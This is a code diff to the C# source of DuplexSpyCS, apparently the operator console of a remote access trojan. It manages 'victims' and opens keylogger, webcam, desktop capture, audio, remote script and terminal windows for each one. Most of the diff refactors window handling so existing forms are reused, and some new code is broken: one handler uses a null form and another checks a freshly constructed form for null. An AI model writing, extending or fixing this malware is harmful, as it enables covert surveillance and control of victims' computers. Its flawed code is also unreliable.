@@ -237,9 +237,13 @@ namespace DuplexSpyCS
 
                             if (width > 256)
                                 width = 255;
+
+                            if (width < 25)
+                                width = 25;
+
                             il_screen.ImageSize = new Size(width, width);
                             Image img = clsTools.Base64ToImage(cmd[10]);
-                            Bitmap bmp = new Bitmap(img, new Size(width, width));
+                            Bitmap bmp = new Bitmap(img, new Size(255, 255));
                             il_screen.Images.Add(v.ID, bmp);
                             v.img_LastDesktop = bmp;
 
@@ -269,7 +273,6 @@ namespace DuplexSpyCS
                 {
                     if (cmd[1] == "client")
                     {
-                        //frmClientConfig f = (frmClientConfig)clsTools.GetFormByVictim(v, Function.ClientConfig);
                         frmClientConfig f = clsTools.fnFindForm<frmClientConfig>(v);
                         if (f == null)
                             return;
@@ -309,7 +312,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "pc")
                     {
-                        frmInfo f = (frmInfo)clsTools.GetFormByVictim(v, Function.Information);
+                        frmInfo f = clsTools.fnFindForm<frmInfo>(v);
                         if (f == null)
                             return;
 
@@ -368,7 +371,10 @@ namespace DuplexSpyCS
                             return;
                         }
 
-                        f.File_AddItems(cmd[2], cmd[3], cmd[4]);
+                        int nTotalDir = int.Parse(cmd[5]);
+                        int nTotalFile = int.Parse(cmd[6]);
+
+                        f.File_AddItems(cmd[2], cmd[3], cmd[4], nTotalDir, nTotalFile);
                     }
                     else if (cmd[1] == "goto")
                     {
@@ -565,7 +571,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "find")
                     {
-                        frmFileFind ff = (frmFileFind)clsTools.GetFormByVictim(v, Function.FileFind);
+                        frmFileFind ff = clsTools.fnFindForm<frmFileFind>(v);
                         if (ff == null)
                             return;
 
@@ -1035,7 +1041,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "desktop")
                 {
-                    frmDesktop f = (frmDesktop)clsTools.GetFormByVictim(v, Function.Desktop);
+                    frmDesktop f = clsTools.fnFindForm<frmDesktop>(v);
                     if (f == null)
                         return;
                     if (cmd[1] == "init")
@@ -1053,7 +1059,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "webcam")
                 {
-                    frmWebcam f = (frmWebcam)clsTools.GetFormByVictim(v, Function.Webcam);
+                    frmWebcam f = clsTools.fnFindForm<frmWebcam>(v);
                     if (f == null)
                         return;
 
@@ -1544,12 +1550,20 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                clsVictim v = GetVictim(item);
-                frmManager f = new frmManager(v);
-                f.Text = $@"Manager\\{v.ID}";
-                f.Tag = Function.Manager;
+                clsVictim victim = GetVictim(item);
+                frmManager f = clsTools.fnFindForm<frmManager>(victim);
+                if (f == null)
+                {
+                    f = new frmManager(victim);
+                    f.Text = $@"Manager\\{victim.ID}";
+                    f.Tag = Function.Manager;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1613,12 +1627,20 @@ namespace DuplexSpyCS
                 }
 
                 clsVictim v = GetVictim(item);
-                frmDesktop f = new frmDesktop();
-                f.Text = $@"Desktop\\{v.ID}";
-                f.Tag = Function.Desktop;
-                f.v = v;
+                frmDesktop f = clsTools.fnFindForm<frmDesktop>(v);
+                if (f == null)
+                {
+                    f = new frmDesktop(v);
+                    f.Text = $@"Desktop\\{v.ID}";
+                    f.Tag = Function.Desktop;
+                    f.v = v;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1636,7 +1658,15 @@ namespace DuplexSpyCS
 
         private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
         {
+            if (e.ColumnIndex != 0)
+                return;
+
             int width = listView1.Columns[0].Width;
+            if (width < 25)
+            {
+                width = 25;
+            }
+
             if (width < 256)
             {
                 il_screen.ImageSize = new Size(width, width);
@@ -1663,7 +1693,7 @@ namespace DuplexSpyCS
             listView1.View = View.Details;
             listView1.Columns[0].Width = screen_width;
 
-            il_screen.ImageSize = new Size(screen_width, screen_width);
+            //il_screen.ImageSize = new Size(screen_width, screen_width);
 
             foreach (ListViewItem item in listView1.Items)
                 item.Text = string.Empty;
@@ -1679,13 +1709,20 @@ namespace DuplexSpyCS
                 if (item.SubItems[9].Text != "0")
                 {
                     clsVictim v = GetVictim(item);
-                    frmWebcam f = new frmWebcam();
-                    f.Text = $@"Webcam\\{v.ID}";
-                    f.v = v;
-                    f.Tag = Function.Webcam;
-                    f.Text = @$"{item.SubItems[1].Text}\\Webcam";
+                    frmWebcam f = new frmWebcam(v);
+                    if (f == null)
+                    {
+                        f = new frmWebcam(v);
+                        f.Text = $@"Webcam\\{v.ID}";
+                        f.v = v;
+                        f.Text = @$"{item.SubItems[1].Text}\\Webcam";
 
-                    f.Show();
+                        f.Show();
+                    }
+                    else
+                    {
+                        f.BringToFront();
+                    }
                 }
                 else
                 {
@@ -1700,13 +1737,19 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                frmInfo f = new frmInfo();
-                f.Text = $@"Information\\{v.ID}";
-                f.StartPosition = FormStartPosition.CenterScreen;
-                f.Tag = Function.Information;
-                f.v = v;
+                frmInfo f = clsTools.fnFindForm<frmInfo>(v);
+                if (f == null)
+                {
+                    f = new frmInfo(v);
+                    f.Text = $@"Information\\{v.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1715,12 +1758,19 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmFunStuff f = new frmFunStuff();
-                f.v = GetVictim(item);
-                f.Tag = Function.FunStuff;
-                f.Text = @$"FunStuff\\{f.v.ID}";
+                clsVictim victim = GetVictim(item);
+                frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(victim);
 
-                f.Show();
+                if (f == null)
+                {
+                    f.Text = @$"FunStuff\\{f.v.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1748,14 +1798,20 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmKeyLogger f = new frmKeyLogger();
-                f.v = GetVictim(item);
-                f.Tag = Function.KeyLogger;
-                //ColorStyle(ColorStyleMode.LightMode, this);
-                f.Text = $@"Keylogger\\{f.v.ID}";
-                f.StartPosition = FormStartPosition.CenterScreen;
+                clsVictim victim = GetVictim(item);
+                frmKeyLogger f = clsTools.fnFindForm<frmKeyLogger>(victim);
+                if (f == null)
+                {
+                    f = new frmKeyLogger(victim);
+                    f.Text = $@"Keylogger\\{f.v.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1765,13 +1821,20 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                frmChat f = new frmChat();
-                f.Text = $@"Chat\\{v.ID}";
-                f.Tag = Function.Chat;
-                f.v = v;
-                f.StartPosition = FormStartPosition.CenterScreen;
+                frmChat f = clsTools.fnFindForm<frmChat>(v);
+                if (f == null)
+                {
+                    f = new frmChat(v);
+                    f.Text = $@"Chat\\{v.ID}";
+                    f.Tag = Function.Chat;
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1894,13 +1957,19 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
+                frmClientConfig f = clsTools.fnFindForm<frmClientConfig>(victim);
+                if (f == null)
+                {
+                    f = new frmClientConfig(victim);
+                    f.Text = $@"ClientConfig\\{victim.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                frmClientConfig f = new frmClientConfig(victim);
-                f.Tag = Function.ClientConfig;
-                f.Text = $@"ClientConfig\\{victim.ID}";
-                f.StartPosition = FormStartPosition.CenterScreen;
-
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1910,12 +1979,19 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                frmWMI f = new frmWMI();
-                f.StartPosition = FormStartPosition.CenterScreen;
-                f.Tag = Function.WMI;
-                f.v = v;
-                f.Text = $@"WMI\\{v.ID}";
-                f.Show();
+                frmWMI f = clsTools.fnFindForm<frmWMI>(v);
+                if (f == null)
+                {
+                    f = new frmWMI(v);
+                    f.StartPosition = FormStartPosition.CenterScreen;
+                    f.Text = $@"WMI\\{v.ID}";
+
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1924,13 +2000,20 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmAudio f = new frmAudio();
-                f.v = GetVictim(item);
-                f.Text = $@"Audio\\{f.v.ID}";
-                f.Tag = Function.Audio;
-                f.StartPosition = FormStartPosition.CenterScreen;
+                clsVictim victim = GetVictim(item);
+                frmAudio f = clsTools.fnFindForm<frmAudio>(victim);
+                if (f == null)
+                {
+                    f = new frmAudio(victim);
+                    f.Text = @$"Audio\\{victim.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1955,12 +2038,19 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                frmPower f = new frmPower();
-                f.StartPosition = FormStartPosition.CenterScreen;
-                f.v = v;
-                f.Text = $@"Computer Power\\{v.ID}";
+                frmPower f = clsTools.fnFindForm<frmPower>(v);
+                if (f == null)
+                {
+                    f = new frmPower(v);
+                    f.Text = @$"Power\\{v.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -1969,11 +2059,18 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmSystem f = new frmSystem();
-                f.v = GetVictim(item);
-                f.Tag = Function.System;
-                f.Text = $@"System\\{f.v.ID}";
-                f.Show();
+                clsVictim victim = GetVictim(item);
+                frmSystem f = clsTools.fnFindForm<frmSystem>(victim);
+                if (f == null)
+                {
+                    f = new frmSystem(victim);
+                    f.Text = $@"System\\{f.v.ID}";
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -2018,13 +2115,21 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmRunScript f = new frmRunScript();
-                f.v = GetVictim(item);
-                f.Text = $@"RunScript\\{f.v.ID}";
-                f.Tag = Function.RunScript;
-                f.StartPosition = FormStartPosition.CenterScreen;
+                clsVictim victim = GetVictim(item);
+                frmRunScript f = clsTools.fnFindForm<frmRunScript>(victim);
+                if (f == null)
+                {
+                    f = new frmRunScript(victim);
+                    f.v = GetVictim(item);
+                    f.Text = $@"RunScript\\{victim.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -2200,6 +2305,7 @@ namespace DuplexSpyCS
                 if (f == null)
                 {
                     f = new frmXterm(victim);
+
                     f.Show();
                 }
 
